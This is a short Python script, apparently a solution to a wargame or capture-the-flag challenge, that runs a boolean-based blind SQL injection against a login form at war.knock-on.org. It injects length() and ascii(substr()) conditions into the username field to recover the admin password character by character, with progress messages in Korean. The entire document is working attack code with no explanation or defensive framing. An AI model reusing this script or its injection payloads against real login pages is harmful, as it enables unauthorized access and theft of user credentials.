import requests


def check_length(url):
    for num in range(0, 100):
        param = {"username": f"admin' and length(password)={num} -- 1", "password": "!23"}
        res = requests.post(url, data=param)
        if "Hello" in res.text:
            return num


def find_char(url, length):
    string = ""

    for n in range(1, length + 1):
        print(f"{n}번째 문자 탐색")
        for k in range(32, 127):
            param = {"username": f"admin' and ascii(substr(password,{n},1)) = {k} -- 1 ", "password": "123"}
            res = requests.post(url, data=param)
            if ("Hello" in res.text):
                string += chr(k)
                print(string)
                break
    return string


url = "http://war.knock-on.org:10003/login"
length = check_length(url)
find_string = find_char(url, length)
print("admin password : " + find_string)